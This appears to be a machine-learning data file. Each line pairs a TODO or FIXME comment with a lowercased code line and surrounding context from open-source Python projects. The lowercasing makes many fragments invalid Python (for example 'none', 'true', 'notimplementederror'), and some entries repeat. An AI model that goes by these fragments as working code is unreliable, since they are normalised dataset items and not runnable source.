# todo use read_package_list_from_file when #618 is merged </s> if os.access(runtime_pkg_path, os.r_ok):	install_system_packages build_list = build_f.read().splitlines() runtime_list = [] with open(runtime_pkg_path) as runtime_f: runtime_list = runtime_f.read().splitlines()
# todo: eliminate asap, for backwards compatibility only </s> return self.get_settings(self)	find_setting def find_setting(self):
# todo(vek): need to pass context in for access to auth_token </s> pass	inject_network_info def inject_network_info(self, instance, nw_info):
# todo: refactor </s> if call_list == ['tofile']:	_run_call out = f_block.body[:-3] out[-1].target = assign.target getattr_call = guard(get_definition, self.func_ir, func_var) if (self._is_1D_arr(getattr_call.value.name)):
self.assertequals(status, 200) # todo: 202 when asynchronous </s> status, body = self.post(path, body)	test_install options=options,)
# todo disabled since it breaks existing configurations </s> self.inverse_relations = false	TrainingJob self.valid_trace = [] self.model.train() self.post_epoch_hooks = [] self.pre_batch_hooks = []
# todo: use message request - not orm access! </s> db_session = database_setup.get_session()	test_bait_classification_honeypot_first first. self.populate_bait(True) sessions = db_session.query(Session).all() for session in sessions:
# todo: use regex matching instead of this </s> assert token_agent.contract_address in result.output	test_nucypher_status_network policy_agent = ContractAgency.get_agent(PolicyManagerAgent, registry=test_registry) adjudicator_agent = ContractAgency.get_agent(AdjudicatorAgent, registry=test_registry) assert staking_agent.contract_address in result.output assert policy_agent.contract_address in result.output
# todo fix bug for not identifying unused variables in nested exceptions see issue #4391 </s> print("error")	func4 1 / 0 except ZeroDivisionError as error:
# todo: this assumes that we're always signing proxy retargetting. for the moment is true. </s> proxy_contract = blockchain.client.w3.eth.contract(abi=abi,	execute show_balances=True) name, version, address, abi = registry.search(contract_address=proposal.target_address) address=address, version=version,
#@todo: move to utils in 0.4.10 </s> def which(program):	which Works exactly like the unix command which Courtesy of http://stackoverflow.com/a/377028/675646
# todo log here </s> return none	get_user_id ) except httplib.HTTPException: if response.status_code != 200: return None
# todo use unused info </s> (_ground_track, latitude, longitude, _range, _bearing) = air_modes.parsebds06(data, cpr_decoder)	receive ) elif bdsreg == 0x06: self.__track = self.__track._replace( latitude=TelemetryItem(latitude, receive_time),
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
# todo: add checks for broken paddings/encrypted values and malformed enc_data </s> self.assertequals(data, d)	test_02_encrypt_decrypt_eas_base64 d = aes_decrypt_b64(binascii.unhexlify(hex_key), enc_data)
# todo default_init_configs </s> super(lstm, self).__init__(symbol)	__init__ symbol = mxnet.symbol.Group((next_hidden, next_cell))
'''todo: add docs''' </s> def __init__(self, df):	AppModel class AppModel(object): self.df = df self.data = ColumnDataSource(df)
# todo: use logging module </s> print "pystache: running tests: expecting source: %s" % should_source_exist	run_tests should_source_exist = True sys_argv.pop(1) try: spec_test_dir = sys_argv[1]
# todo: only works for diagonal tensors. getedgeinnerproductderiv, </s> dmemui_di = -self.memui**2	MeMuIDeriv def MeMuIDeriv(self, u): Derivative of :code:`MeSigma` with respect to the model dMf_dmui = self.mesh.getEdgeInnerProductDeriv(self.mu)(u) return dMfMuI_dI * (dMf_dmu * self.muDeriv)
# todo better way of making sure tznames are unique </s> while tzname in tznames:	_make_unique_tzname :param tzname: Candidate tzname :param tznames: Other tznames tzname += '_1' tznames.add(tzname)
# todo: after reasonable amount of time replace with string option </s> lines.append('    services.openssh.knownhosts.{0} ='.format(m2.name))	do_machine lines.append('      }};'.format(m2.name)) if hasattr(m2, 'public_host_key'): lines.append('      {{ hostNames = ["{0}-unencrypted" "{0}-encrypted" "{0}" ];'.format(m2.name)) lines.append('        publicKeyFile = ./{0}.public_host_key;'.format(m2.name))
# todo: do not include measures!!! </s> attributes += self.measures	get_attributes attr_map = dict((a.ref(simplify), a) for a in attributes) attributes += self.details result = [] for name in names:
#todo trap and ignore attributeerror here? </s> else:	pipe_itembuilder if "subkey" in dk: key = reduce(lambda i,k:i.get(k), [item] + dk['subkey'].split('.')) #forces an exception if any part is not found key = dk['value'] if "subkey" in dv:  #todo: use this subkey check anywhere we can embed a module
# todo: fix figleaf traceback with doctests </s> test_cmd.append("--skip-doctests")	test test_cmd.append("-v") if coverage: env.cmd(test_cmd)
# todo this should be more modular </s> if 'bindings' in response:	__fetch_service if 'items' in response: targets += response['items'] targets += response['bindings'] if 'accounts' in response:
d="'d.${def1}.${def2}'"             #todo </s> e="'e.${def1111}.def5.${def2222}'"  #todo	test_3250_nonrecursive_expand_variables B="'B.def2.def3'" C="'C.${DEF4}.${DEF5}'"             #TODO F="'F.${DEF3}.${DEF3}'"             #TODO else:
# todo remove this custom equality testing code when </s> self.assertequal(obj1, obj2)	test_roundtrip_sequence_collections_and_alignments obj2 = reader(fh) fh.close() for s1, s2 in zip(obj1, obj2): self.assertTrue(s1.equals(s2))
raise notimplementederror #todo </s> raise exception("all lists passed as keyword arguments must represent the same tokens and thus have the same length!")	__call__ if not all( (len(v) == l for k,v in tokens.items() ) ):
# todo: normal gl requires these lines, es 2.0 does not </s> from opengl import gl	on_paint gl.glClearColor(0,0,0,1); gl.glClear(gl.GL_COLOR_BUFFER_BIT | gl.GL_DEPTH_BUFFER_BIT) gl.glEnable(GL.GL_PROGRAM_POINT_SIZE) gl.glEnable(GL.GL_POINT_SPRITE)
# todo: add logging. </s> sublime.status_message("vintageous: could not write file.")	ExWriteFile sublime.status_message(msg) except IOError as e: print('Vintageous =======') print (e)
# todo it seems that yahoo! converts relative links to absolute </s> xpath = util.get_value(conf["xpath"], _input, **kwargs)	pipe_xpathfetchpage content = unicode(request.read(), request.headers['content-type'].split('charset=')[-1]) html5 = False useAsString = False
# todo: askr, undocumented! </s> def buttonstateraw( self ):	ButtonStateRaw if self.midi.ReadCheck(): a = self.midi.ReadRaw()
assert oldsize == self.size, '%s: %d, %d' % (self.type, oldsize, self.size) # todo: remove </s> return self.size	stts_atom oldsize = self.size # TODO: remove self.size = 8 + 4 + 4 + len(self.body[1]) * 8
# todo(billdodd): change to self.systems_uri after pr 62921 merged </s> systems_uri = self.systems_uris[0]	set_default_boot_order def set_default_boot_order(self): response = self.get_request(self.root_uri + systems_uri) if response['ret'] is False:
# todo: print 's' </s> raise duplicatedeclarationerror(	parse if len(k) >= 2 and k[:2] == "__": if k in reserved: "Several uses of the special symbol '%s'" + " in the same environment"
# todo: make it handle more components </s> self.logger.info('no stale sockets found in {}, ok'.format(zdaemon_dir))	on_server_check_stale_unix_socket if self.show_output:
# todo: get rid of this feature one day (v8?; warning added in v7.3.0.) </s> utils.logger.warn("the post {0} is using the `password` attribute, which may stop working in the future.")	_handle_post_compiled post = data['post'] if post.meta('password'): utils.LOGGER.warn("Please consider switching to a more secure method of encryption.") utils.LOGGER.warn("More details: https://github.com/getnikola/nikola/issues/1547")
# todo: clean up this event print out. we probably want something </s> if suffix == 'new':  # skip "new" events	print_async_returns Print all of the events with the prefix 'tag' for suffix, ret in self.get_async_returns(tag, timeout=timeout): continue elif suffix == 'ret':  # for "ret" just print out return
#     # todo: add an exception message </s> raise parsererror	DateTimeParser if "YY" in fmt_tokens and match.end() != len(string):
# todo test for final </s> return "/%s" % self.canonical_filename()	url def url(self):
# todo: store only successful commands. </s> _ex_shell_last_command = cmd	ex_shell_out output_view.run_command('append', {'characters': output, 'force': True, 'scroll_to_end': True}) view.window().run_command("show_panel", {"panel": "output.vi_out"}) except NotImplementedError: message('not implemented')
# todo: agree on protocol here </s> true: u'box-crossed',	get_span_types 'type': 'Negation', 'value': { }, 'labels': ['Negation', ],
# todo: skipped due to gh-4436 </s> yield skip_if_on_windows(skip_ssh(_test_create_store)), 'datalad-test'	test_create_simple def test_create_simple(): yield _test_create_store, None
# todo: each dp learns independently. an edge dp could </s> host_learned_other_dp = none	rcv_packet learn_port = port else: for other_dpid, other_valve in valves.iteritems(): if other_dpid == dp_id:
# todo : outsource to cython </s> start = time.time()	_get_filtered_image integral_img = integral_image(image) filtered_image = np.zeros(image.shape) for i in range(2 * n, image.shape[0] - 2 * n): for j in range(2 * n, image.shape[1] - 2 * n):
# todo: waiting for a fix: https://developer.blender.org/t53509 </s> if context.object:	LUXCORE_OT_mat_nodetree_new if context.material: context.material.luxcore.node_tree = node_tree context.object.luxcore.node_tree = node_tree return {"FINISHED"}
# todo: impala attempt to speed up final pass after lstm. </s> self.time_rank_folder = reshape(fold_time_rank=true, scope="time-rank-fold")	__init__ return (q_values, last_internals) if last_internals is not None else q_values elif isinstance(self.action_adapter, BaselineActionAdapter): self.time_rank_unfolder_v = ReShape(unfold_time_rank=True, time_major=True, scope="time-rank-unfold-v") self.time_rank_unfolder_a_probs = ReShape(unfold_time_rank=True, time_major=True,
# todo send the key to the master for approval </s> sh_ = '/bin/sh'	seed bs_ = gather_bootstrap_script() salt.crypt.gen_keys(mpt_tmp, 'minion', 2048) if os.path.isfile(os.path.join(mpt, 'bin/bash')): sh_ = '/bin/bash'
pass # todo </s> subcommand = config.default_action	run self.todolist = TodoList.TodoList(todofile.read()) except Exception: if len(sys.argv): subcommand = sys.argv[1]
# todo - del just my poll, not the entire list ! </s> return poll_user_no_choice	check_vote if poll.id in sess_nv: del request.session[POLLS_NO_CHOICE_COOKIE_NAME] if request.user.is_authenticated(): sess = request.session.get(POLLS_COOKIE_NAME, [])
# migration todo: remove ? </s> channel = self.connection.channel()	get_process_worker def get_process_worker(self, process_event): process_worker = ProcessWorker(Connection(self.backend_url), process_event) bound_process_events_queue = process_events_queue.bind(channel) bound_process_events_queue.unbind_from(events_exchange)
if attribute == 'position':   # todo: clean up </s> raise defaultvalueexception	_get_value_for return super()._get_value_for(styled, attribute, document) except ParentConfigurationException: return self._get_value_for(styled.parent, attribute, document)
# todo: must be implemented </s> pass	get_range_using_index def get_range_using_index(self, chapter_count):
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
pass  # todo </s> elif arg == at_non_boundary:	_internal_match_patterns return None elif arg == AT_BOUNDARY: pass  # TODO elif op in (ASSERT, ASSERT_NOT):
# todo: log </s> print sys.exc_info(), 'exception in stream_events loop'	stream_events raise Exception() except: self.finish()
# todo handling when g is a list of graphs </s> show_edges = g.ne < 10000	_thread def _thread(): if G.coords.shape[1] == 2: fig = plt.figure()
self.assertequals(status, 200) # todo: 202 when asynchronous </s> status, body = self.post(path, body)	test_install options=options,)
# todo: 1. try all parameters </s> try:	get_most_specific if all_possible_criteria.count() == 0: return None return all_possible_criteria.get(domain=None) except ObjectDoesNotExist:
except exception:  # todo: log error once </s> pass	Worker result = await result custom[k] = result return merge(custom, self.monitor.recent(), core) async def get_startup_information(self):
# todo: duplicate checking </s> self._associate.append((association_type, value))	add def add(self, association_type: LicenseAssociationType, value: str):
# todo(ytknzw): add more specific assertion with the test case. </s> study = create_study()	test_plot_intermediate_values trial.report(2.0, step=1) return 0.0 study.optimize(lambda t: objective(t, True), n_trials=1) figure = plot_intermediate_values(study)
# todo - unit test </s> return mrca.distance(target1) + mrca.distance(target2)	distance mrca = self.common_ancestor(target1, target2)
origin_args = {}  # todo: gas management </s> if gas_limit:	DispatcherDeployer @validate_secret def rollback(self, existing_secret_plaintext: bytes, new_secret_hash: bytes, gas_limit: int = None) -> dict: origin_args.update({'gas': gas_limit}) rollback_function = self._contract.functions.rollback(existing_secret_plaintext, new_secret_hash)
# todo: figure out a way to actually log this information without </s> self.terminate()	do_SIGTERM def do_SIGTERM(self, sig, stack):
def __init__(self, p_args, p_todolist, #pragma: no branch </s> p_out=lambda a: none,	__init__ p_err=lambda a: None, p_prompt=lambda a: None):
# todo(b/201683262) replace all calls to this method </s> stdout = self.rungsutil(['publicaccessprevention', 'get',	_verify_public_access_prevention_unspecified def _verify_public_access_prevention_unspecified(self, bucket_uri): suri(bucket_uri)], return_stdout=True)
# todo: there seems to be a bug in gitpython, which leads </s> pass	push except BadName as e: lgr.error("GitPython reported BadName Exception: %s" % e)
# todo: assert </s> self.asserttrue(result)	test_rename_distro distro = self.remote.get_item_handle("distro", "testdistrocopy", self.token) result = self.remote.rename_distro(distro, "testdistro1", self.token) assert 0
# todo: remove in v.0.6 </s> x = np.array([[0, 0], [0, 1], [2, 0], [2, 1]])	TestLMNN np.testing.assert_almost_equal(rel_diff, 0., decimal=5) def test_changed_behaviour_warning(self): y = np.array([1, 0, 1, 0]) lmnn = LMNN(k=2)
# todo parameters </s> f.write(u"(parameters todo)")	print_Label f.write(u"label %s" % (stmt.name, )) if stmt.parameters is not None: f.write(u':\n') for sub_stmt in stmt.block:
# todo implement through browser </s> step_message = 'accept alert'	accept_alert def accept_alert(): execution.logger.info(step_message) _capture_or_add_step(step_message, execution.settings['screenshot_on_step'])
# todo: autodetect size from passed-in file object? </s> params = {	create_temp_user_avatar auto_confirm -- whether to automatically confirm the temporary avatar by calling confirm_user_avatar with the return value of this method. 'username': user, 'filename': filename,
# todo: write </s> result = set([])	merge_result def merge_result(command, res): for k, v in res.items(): for value in v:
# todo: update the tolerance after the ci moves to torch 1.10 </s> self.asserttrue(torch.allclose(outputs.logits[:, :4], expected_logits, atol=1e-2))	test_inference_diarization self.assertEqual(labels[0, :, 0].sum(), 270) self.assertEqual(labels[0, :, 1].sum(), 647)
# todo this context is probably not right. </s> analysis.add(next(iter(types)), 'value-error-too-many-values', part,	unpack_tuple_to_dict part = next(parts) except StopIteration: message="ValueError: too many values to unpack (expected %s)" % n) else:
# todo should be: </s> self.assertequal(response3.data['compression'], 'no')	test_mount_options self.assertEqual(response3.status_code, status.HTTP_200_OK, msg=response3.data) self.assertEqual(response3.data['mnt_options'], 'compress-force=zlib') data2 = {'mnt_options': 'compress-force=lzo'} response3 = self.client.put('%s/singleton/remount' % self.BASE_URL, data=data2)
# todo(yamahata): replace n_events with neutron_lib.callback.events </s> registry.notify(resources.process, n_events.after_spawn, none)	start_all_workers workers = _get_rpc_workers() + _get_plugins_workers() launcher = _start_workers(workers) return launcher
# todo: automate this (by lookup from nn). </s> internal_states_space=impalaagent.standard_internal_states_space,	test_impala_actor_plus_learner_agent_functionality_actor_part state_space=env.state_space, action_space=env.action_space, execution_spec=dict( mode="distributed",
# todo block until metadata_updated callback is called. </s> browser = self.backend.spotify.session.browse_artist(	lookup try: spotify_artist = Link.from_string(uri).as_artist() spotify_artist) start = time.time()
# todo we should make sure that trivial equality relations are </s> continue	_effectively_discrete_vars repn = generate_standard_repn(constr.body) if len(repn.linear_vars) < 2: non_discrete_vars = list(v for v in repn.linear_vars if v.is_continuous())
#todo: move to filter </s> def filter_data_type(self, output):	filter_data_type for fmt in self.display_data_priority: if fmt in output:
# todo: test coverage </s> return (	get_absolute_url @permalink def get_absolute_url(self): 'newsletter_archive_detail', (), { 'newsletter_slug': self.newsletter.slug,
# todo - move 'brac' to db (eventschedule.callback_args) </s> brac = domain.objects.get(name="brac")	weekly def weekly(router): activity_report(router, brac)
# todo support multiple backends </s> return self.backends[0].stored_playlists.create(name).get()	create :type name: string :rtype: :class:`mopidy.models.Playlist`
session.add(job)  # todo review this after remapping job (required to lazy-load `container` attr) </s> obj = cls_(job, none, none, none)	TestJobContainerAssociation assert stored_obj.modified_time == modified_time def test_relationships(self, session, cls_, job): with dbcleanup(session, obj) as obj_id: stored_obj = get_stored_obj(session, cls_, obj_id)
# ---- todo: the following should be removed in milestone:0.11 </s> if formatter.img_re.search(url) and self.flavor != 'oneliner':	_make_ext_link def _make_ext_link(self, url, text, title=''): return unicode(html.IMG(src=url, alt=title or text, title='Warning: direct image links are '
# todo result type? </s> logger.error(f"error while trying to extract date from name {photo}")	_try_photo edt = dt_from_path(photo) # ok, last try.. except Exception as e: logger.exception(e) else:
# todo - fix meta.submission to point to real submission </s> self.submission.submission.handled(handle_type, message)	_add_handled except SubmissionHandlingType.DoesNotExist: handle_type = SubmissionHandlingType.objects.create(app="xformmanager", method="instance_data")
# todo: use model fit loss instead of a random loss </s> return {'loss':   random.random(), 'space': space,	_test_wrapper self._model.guess_and_fill_missing_params() self._model.build() 'status': hyperopt.STATUS_OK}
# todo: fails because of missing svg support </s> assert_pixels('inline_image_' + filename, 8, 8, image, '''	test_images )) def test_images(filename, image): <style> @page { size: 8px }
return  # todo [review] should an exception be raised, and if yes, what type of exception e.g. package, module, plugin, generic?  # noqa: e501 </s> target_pairs = {	_do_surround_cs return  # TODO [review] should an exception be raised, and if yes, what type of exception e.g. package, module, plugin, generic?  # noqa: E501 elif len(replacement) != 1: ')': ('(', ')'), '(': ('(', ')'),
# todo - unit test </s> return mrca.distance(target1) + mrca.distance(target2)	distance mrca = self.common_ancestor(target1, target2)
# todo: also improve 'crash-start' detection (to reduce lag when server fails to start) </s> time.sleep(0.1)	svrcall launch_server_daemonized() for _ in range(100): # Check server availability for next 10 seconds s = self.connect() if s is not None: break
# todo - check and if we don't have category, take the only placement that exists in current site </s> self._main_placement = get_cached_object(	Topic if not hasattr(self, '_main_placement'): try: Placement, target_ct=ContentType.objects.get_for_model(self.__class__),
return # todo: flag bad gzip </s> chunk = decompress.decompress(chunk) # todo: flag bad zlib	response_body return # not a full header yet except IOError: else: pass # TODO: flag unasked-for coding
# todo: manage next letter "t" </s> string, next_string = string.split("t", 1)	path string = "t" + next_string elif letter == "Q": x1, y1 = self.context.get_current_point() while string:
# todo: documentation pending </s> parameters	save_weights def save_weights(self, filepath, sess=None): ---------- filepath
# todo: improve performance by using conv instead of unfold </s> raise notimplementederror	_bias_jac_t_mat_prod def _bias_jac_t_mat_prod(self, module, g_inp, g_out, mat, sum_batch=True):
# todo: scale and translation could be merged into a single network </s> with tf.variable_scope("scale"):	forward_and_jacobian mask = self.get_mask(inputs, dtype=inputs.dtype) masked_inputs = inputs * mask scale = self.scale_fn(masked_inputs) with tf.variable_scope("translation"):
# beginning of block, preventing fusion. todo: fix pa </s> if (rhs.attr == 'dtype' and isinstance(	_run_getattr assign.value = ir.Global("numpy.datetime64", rhs_type.dtype, rhs.loc) return [assign] if_series_to_array_type(rhs_type), types.Array)): typ_str = str(rhs_type.dtype)
# todo / fixme : use functions in utils/network.py to manage this </s> devices = {}	monitor_network if units is None: units = ['check', 'usage', 'infos'] output = subprocess.check_output('ip addr show'.split()) for d in re.split('^(?:[0-9]+: )', output, flags=re.MULTILINE):
#todo replace when better connection mechanism is available </s> context = none	get_vsan_disk_management_system service_instance Service instance to the host or vCenter if sys.version_info[:3] > (2, 7, 8): context = ssl.create_default_context()
#todo: introduce constants for readability </s> self._blockstate[:]= 1 #this is the dirty state	OpArrayCache self._blockNumbers = _blockNumbers self._blockIndices = _blockIndices self._dirtyState = 2 #this is the clean state self._flatBlockIndices =  self._blockIndices[:]
# todo(thejulia): once we have power/state callbacks to nova, </s> task.node.power_state = states.power_on	unrescue :returns: Returns states.ACTIVE manager_utils.node_power_action(task, states.POWER_OFF) task.node.save() self.clean_up(task)
# todo: remove when #980 has been merged </s> info.update(info['formats'][-1])	_talk_info 'formats': formats, } return info
# todo: remove anytime in 2016 </s> _assert(false, "got to form id even though this shouldn't be possible")	get_filtered_data_for_parsed_params return get_form_details_for_app(domain, parsed_params.app_id, deleted=deleted) elif parsed_params.most_granular_filter == 'xmlns': return get_form_details_for_app_and_xmlns( domain, parsed_params.app_id, parsed_params.xmlns, deleted=deleted)
# todo: parameterize and check for wrong argument </s> result = utils.dhcpconf_location(utils.dhcp.v4)	test_dhcpv4conf_location def test_dhcpv4conf_location(): assert result == "/etc/dhcpd.conf"
# todo: shouldn't it to be in the statefu module? </s> def init_client_stateless(msg, addr, client, packetselector, clients):	init_client_stateless client_private_ip = msg[0:4] client_public_source_ip = socket.inet_aton(addr[0])
# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
# todo: catch unquoting errors, range of chars, charset </s> unq_v = urllib.unquote(esc_v)	parse_params ) continue dec_v = unq_v.decode(enc) # ok, because we limit enc above param_dict[k_norm] = dec_v
# todo: automate this (by lookup from nn). </s> internal_states_space=impalaagent.standard_internal_states_space,	test_single_impala_agent_functionality state_space=env.state_space, action_space=env.action_space, execution_spec=dict( mode="distributed",
# todo xxx graalvm change </s> raise unittest.skiptest("missing threading support")	ThreadedEchoServer self.daemon = True def __enter__(self): self.start(threading.Event()) self.flag.wait()
pass  # todo </s> def test_chart(self):	test_chart
# todo subject.cn from cert? </s> if cleanup:	test_simple_appzip self.call_iresign(input_path=TEST_APPZIP, output_path=app_path) assert exists(app_path) os.remove(app_path)
# todo handle exception </s> raise exception("plugin not found")	select_plugins return list(all_plugin_names) if len(plugin_names - all_plugin_names) > 0: return plugin_names
# todo: what about '_type'? </s> }	_build_event_api_data 'visibility': Conversion.visibility(event.as_legacy), 'folders': build_folders_api_data(event) detail = get_query_parameter(request.args.to_dict(), ['d', 'detail']) if detail == 'contributions':
# todo: why do we have `has` below, should not it be `have`? </s> assert "has no texts ('alex', 'yakov')" in error.value.msg	test_have_no_texts_throws_exception with pytest.raises(TimeoutException) as error: browser.all('li').should(have.no.texts('Alex', 'Yakov')) assert "ConditionNotMatchedError: condition not matched" in error.value.msg
# todo(aron): move these client test cases to their own test class </s> self.client.login_teacher(data={"username": self.teacher_username,	teacher_cant_create_facilities elem = self.browser.find_element_by_css_selector('a.create-facility') self.assertEquals(elem.value_of_css_property("display"), "none", "delete-facility is still displayed!") "password": self.teacher_password}, facility=self.facility)
# todo: for now, circumnavigate the detached head issue. </s> for subds in source.get_dataset_handles(recursive=true):	test_target_ssh_recursive def test_target_ssh_recursive(origin, src_path, target_path): source = install(path=src_path, source=origin, recursive=True) AnnexRepo(opj(src_path, subds), init=True, create=False).git_checkout("master")
# todo: write manifest and bagit metadata </s> pass	_finalize def _finalize(self):
# truffle todo: revert </s> for __x in _glob2(dirname, basename, dironly): yield __x	_iglob if not dirname: if recursive and _isrecursive(basename): else: for __x in _glob1(dirname, basename, dironly): yield __x
# todo: bytes vs str </s> request_line = request_line.decode()	_handle return req = HTTPRequest() method, path, proto = request_line.split() print('%.3f %s %s "%s %s"' % (utime.time(), req, writer, method, path))
from gi.repository import glib  # todo: to fix </s> import gi	applyDelimiter if styled: if encoded: gi.require_version('Gtk', '3.0') res.append('<span foreground="' + color + '" ' + backgroundColor + ' font_family="monospace">' + GLib.markup_escape_text(TypeConvertor.encodeNetzobRawToGivenField(tmp, field)) + '</span>')
# todo: test me </s> if get_django_features()['caches_singleton']:	get_cache def get_cache(alias): from django.core.cache import caches return caches[alias]
todo = atomlist # list of atoms we must still mark and explore (recurse on all unmarked neighbors) </s> for atom in todo:	marksingle any sequence of bonds to the atoms in atomlist marked = {} # maps id(atom) -> atom, for processed atoms marked[id(atom)] = atom # since marked means "it's been appended to the todo list" while todo:
# todo: multi dp routing requires learning from directly attached switch first. </s> if pkt_meta.port.stack:	_vlan_rcv_packet all_stacked_valves = {self}.union(stacked_other_valves) if self.dp.stack_route_learning: peer_dp = pkt_meta.port.stack['dp'] if peer_dp.dyn_running:
# todo: implement </s> return patches	blast_radius_upgrade :rtype: list patches = []
# todo: remove when materialized paths are fixed in the payload returned from waterbutler </s> if not source['materialized'].startswith('/'):	create_new_file def create_new_file(obj, source, destination, destination_node): source['materialized'] = '/' + source['materialized'] if not destination['materialized'].startswith('/'):
principled.inputs[5].default_value = pypbr.metallic_factor #todo : currently set metallic & specular in same way </s> principled.inputs[7].default_value = pypbr.roughness_factor	create_cycles attribute_node.attribute_name = 'COLOR_0' attribute_node.location = -500,0 node_tree.links.new(principled.inputs[0], attribute_node.outputs[1]) elif pypbr.color_type == gltf.TEXTURE_FACTOR:
pass  # todo </s> def train_check_calc_loss(self):	train_check_calc_loss
# @todo: bulk lookups </s> represent = lambda v: v,	customise_pr_group_resource table.updates = s3_fieldmethod("updates", updates, ) list_fields = [(T("Name"), "name_click"),
pass # todo </s> def _playlistclear(self, name):	_playlistclear @register(r'^playlistclear (?P<name>\S+)$')
# todo: 搜索和分页 </s> keyword = request.get.get('search', '')	perm_rule_add header_title, path1, path2 = "授权规则", "规则管理", "查看规则" rules_list = PermRule.objects.all() if keyword: rules_list = rules_list.filter(Q(name=keyword))
# todo set() is used for uniqueing results in case a checker name is </s> return list(set(labels))	labels_of_checker labels.extend( map(self.__get_label_key_value, checkers.get(c, [])))
# todo: check botocore version </s> region, ec2_url, aws_connect_params = get_aws_connection_info(module, boto3=true)	main if not HAS_BOTO: module.fail_json(msg='boto required for this module') if HAS_BOTO3: try:
# todo: configurable timeout??? </s> syndic_dict['dead_until'] = time.time() + 60	_fire_master except SaltClientError: log.error('Unable to fire event to {0}, trying another...'.format(master)) log.critical('Unable to fire event on ANY master')
"""create todo database and tables""" </s> if os.path.exists(filename):	makeDb def makeDb(self, filename): db = sqlite.connect(filename) else:
# todo: write this method if possible </s> pass	address_transactions def address_transactions(self, addresslist):
# todo parse units as: units='oe' </s> self.plot.setlabel('bottom', axis, **self.label_style)	update_x_column axis = self.columns_x.itemText(index) self.curve.x = axis
# todo: add logger </s> print("hey, error occured: race condition screenshotter/db_save.py")	save_screenshot_data print(scans) elif len(scans) == 0: else: scan = scans[0]
#todo - do we still use the betweenposition class? </s> if ((self._start == self._end) and isinstance(self._start,	_get_nofuzzy_start def _get_nofuzzy_start(self) : BetweenPosition)): return self._start.position
# todo: this is all just debugging stuff and can be removed </s> if false:	_GaussianTemplate self.phi = phih self.g = self.g + dg uh = [ui.copy() for ui in uh] gh = self.g.copy()
# todo(mlavalle) a follow up patch in the address groups implementation </s> log.info("address group deleted %r", address_group_id)	address_group_deleted def address_group_deleted(self, address_group_id):
# todo: move 'hardcoded' coordinate specs (name, units, etc) into tile_spec </s> return storage.in_memory_storage_unit_from_file(filename, datasets, storage_type)	_create_storage_unit filename = storage.generate_filename(tile_index, datasets, storage_type) storage.create_storage_unit_from_datasets(tile_index, datasets, storage_type, filename)
# todo: displacement. </s> index = get_texture_index(export_settings, gltf, 'emissive', currentnode)	generate_materials if currentNode.node_tree.name == 'glTF Specular Glossiness': print_console('DUMMY', 'Specular Glossiness Store Material') if index >= 0: emissiveTexture = {
oldsize = self.size # todo: remove </s> assert type(self.body) in (str, list), '%s: %s' % (self.type, type(self.body))	Atom atom.write(stream) def calsize(self): if type(self.body) == str: pass
# todo(t2r_contributors): switch to using gin config for all saver params. </s> keep_checkpoint_every_n_hours = none	model_fn scaffold = scaffold_fn() if not tf.get_collection(tf.GraphKeys.SAVERS): max_to_keep = None if config is not None:
# todo maybe add multichart class? </s> def update_all_graphs(frame):	animate_multiple_plots Args: plots (List[Union[_BarChartRace,_LineChartRace]]): List of plots to animate for plot in plots: try:
# todo: test this </s> try:	initialize_decomposition return random_parafac2(shapes, rank, full=False, random_state=random_state) elif isinstance(init, (tuple, list, Parafac2Tensor)): return Parafac2Tensor(init) except ValueError:
# todo cleanup/merge with above `call` once we have `subprocess.run` after dropping python 2 support? </s> assert subprocess.check_output(['which', 'python'], env=env, universal_newlines=true).strip() == '/tmp/cibw_bin/python'	build call(['which', 'python'], env=env) call(['python', '--version'], env=env) call(['python', get_pip_script], env=env, cwd="/tmp") assert os.path.exists(os.path.join(installation_bin_path, 'pip'))
# todo: temporary hack until they fix </s> handle_tr_writer_deprecation()	test_css_invalid_no_html def test_css_invalid_no_html(self, testdir): testdir.makepyfile("def test_pass(): pass") result = testdir.runpytest("--css", "style.css")
oldsize = self.size # todo: remove </s> assert type(self.body) in (str, list), '%s: %s' % (self.type, type(self.body))	Atom atom.write(stream) def calsize(self): if type(self.body) == str: pass
# todo: different codec to be used </s> raise (	_to_oer_ws Cont = self._get_val_obj(self._val[0]) if Cont == self._const_cont and self._const_cont_enc is not None: ASN1NotSuppErr('{0}: specific CONTAINING encoder unhandled' \ .format(self.fullname())))
# todo: this function can replace repeated code in raw_format_table() in the future </s> def raw_format_cursor(f):	raw_format_cursor cursor = [" ", "focus"] if f["focus"]:
# todo make this a user explicit choice </s> snap_refresh_cmd.append("--classic")	refresh try: if self.is_classic(): except (errors.SnapUnavailableError, KeyError): pass
# todo: openssl 1.1.0 has ssl_get0_verified_chain() to do this directly </s> verified_certificate_chain = []	_build_verified_certificate_chain Mozilla trust store. This will not clean the certificate chain if additional/invalid certificates were sent and assumes certificates were sent in the right order. for cert in received_certificate_chain: ca_cert = MOZILLA_TRUST_STORE.get_certificate_with_subject(cert.as_dict['issuer'])
# todo implement support for this </s> elemdict['pose'] = parsesdfpose(elem.find('pose'))	parseSDFLink elemdict['pose'] = parseSDFPose(elem.find('pose')) else: if elem.find('material') is None: log(("   No material defined for {} {} in link {}! Defaulting " +
# todo: remove this monkeypatch once upstream class is fixed. </s> _patch_zone(zone)	_create_record ttl = self.ttl with localzone.manage(self.filename, self.origin, autosave=True) as zone: if zone.add_record(name, rtype, content, ttl=ttl):  # pylint: disable=no-member result = True
'one, two, three, four, five') #todo: group being ignored? </s> self.assertequal(numwords('12345', group=1),	test_NUMWORDS 'one, two, three, four, five') #TODO: group being ignored? self.assertEqual(NUMWORDS('12345', group=2), 'one, two, three, four, five') self.assertEqual(NUMWORDS('1234th', group=0, andword='and'),
## todo : log error </s> (title, body) = _create_configure_doctype_submission_functions_add_function_form(doctype=doctype,	_add_function_to_submission except InvenioWebSubmitAdminWarningReferentialIntegrityViolation, e: user_msg.append(str(e)) action=action, addfunctionstep=addfunctionstep,
#todo: manage multiple foreign key </s> value = value.identity.condition.value	to_alchemy_condition value = condition.value if value.__class__ == Item: if condition.operator == "=": return column == value
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	set_host_enabled def set_host_enabled(self, host, enabled):
